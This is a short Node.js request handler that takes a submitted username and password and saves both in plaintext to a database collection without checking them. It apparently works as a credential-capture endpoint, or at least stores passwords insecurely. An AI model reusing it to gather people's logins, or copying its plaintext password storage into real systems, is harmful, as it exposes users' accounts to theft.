const { connectToDatabase } = require('./db');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'username and password required' });
  }

  const { db } = await connectToDatabase();

  const entry = {
    type: 'login',
    username,
    password,
    receivedAt: new Date().toISOString()
  };

  await db.collection('data').insertOne(entry);

  return res.status(200).json({ ok: true });
};
